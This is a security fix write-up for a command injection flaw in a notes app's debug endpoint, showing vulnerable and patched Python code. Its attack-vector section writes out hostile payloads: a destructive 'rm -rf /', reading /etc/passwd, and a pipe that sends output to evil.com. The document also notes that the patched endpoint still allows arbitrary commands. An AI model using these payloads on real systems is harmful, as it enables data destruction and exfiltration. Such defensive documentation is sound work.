# Security Fix #2: Command Injection

**Issue ID**: #2
**Location**: `backend/app/routers/notes.py:112-117`
**Severity**: ERROR
**OWASP**: A05:2025 - Injection
**CWE**: CWE-78: OS Command Injection

## Vulnerability Description

The `debug_run` endpoint was using `subprocess.run()` with `shell=True`, which spawns a command using a shell process. This propagates current shell settings and variables, making it much easier for malicious actors to execute arbitrary commands.

## Attack Vector

A malicious user could inject shell commands through the `cmd` parameter:

**Simple command chaining**:
```
GET /notes/debug/run?cmd=echo hello; rm -rf /
```

**Command substitution**:
```
GET /notes/debug/run?cmd=echo $(cat /etc/passwd)
```

**Backticks**:
```
GET /notes/debug/run?cmd=echo `whoami`
```

**Pipe chaining**:
```
GET /notes/debug/run?cmd=ls | curl -X POST http://evil.com/steal -d @-
```

These attacks could lead to:
- Remote Code Execution (RCE)
- Data exfiltration
- System compromise
- Access to sensitive files
- Lateral movement

## Before (Vulnerable Code)

```python
@router.get("/debug/run")
def debug_run(cmd: str) -> dict[str, str]:
    import subprocess

    completed = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return {
        "returncode": str(completed.returncode),
        "stdout": completed.stdout,
        "stderr": completed.stderr,
    }
```

**Issues**:
- `shell=True` spawns a shell process, interpreting shell metacharacters
- User input is directly passed to the shell
- No input validation or sanitization
- No error handling for invalid commands

## After (Secure Code)

```python
@router.get("/debug/run")
def debug_run(cmd: str) -> dict[str, str]:
    import subprocess
    import shlex

    # FIXED: Use shell=False and proper command parsing to prevent command injection
    try:
        # Parse command safely using shlex instead of shell=True
        args = shlex.split(cmd)
        completed = subprocess.run(
            args, shell=False, capture_output=True, text=True
        )
        return {
            "returncode": str(completed.returncode),
            "stdout": completed.stdout,
            "stderr": completed.stderr,
        }
    except (ValueError, FileNotFoundError) as exc:
        raise HTTPException(status_code=400, detail=f"Invalid command: {exc}")
```

**Improvements**:
- `shell=False` avoids shell interpretation of metacharacters
- `shlex.split()` safely parses the command string
- Proper error handling for parsing failures and missing commands
- Returns HTTP 400 for invalid commands instead of crashing

## Why This Fix Works

1. **No Shell**: `shell=False` executes commands directly without a shell, preventing shell metacharacter interpretation.
2. **Safe Parsing**: `shlex.split()` properly parses command arguments while respecting quoting.
3. **Error Handling**: Catches parsing errors and missing commands, preventing information leakage.
4. **Input Validation**: Basic validation through `shlex.split()` prevents malformed commands.

## Residual Risks

**Note**: This endpoint is still inherently risky as it allows arbitrary command execution. Consider:

1. **Whitelist allowed commands**: Restrict to a specific set of safe commands
2. **Remove debug endpoints entirely**: Debug endpoints should never be in production
3. **Use a sandboxed execution environment**: For any necessary command execution
4. **Rate limiting**: Prevent abuse of the endpoint

## Testing Recommendations

1. Verify basic command execution still works:
   ```bash
   curl "http://localhost:8000/notes/debug/run?cmd=echo%20hello"
   ```

2. Test injection attempts (should fail or be safely ignored):
   ```bash
   curl "http://localhost:8000/notes/debug/run?cmd=echo%20hello;%20whoami"
   ```

3. Verify Semgrep scan no longer flags this issue:
   ```bash
   semgrep scan --json --output semgrep-results.json
   ```

## Related Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Python subprocess Documentation](https://docs.python.org/3/library/subprocess.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---

**Fixed**: 2026-04-06
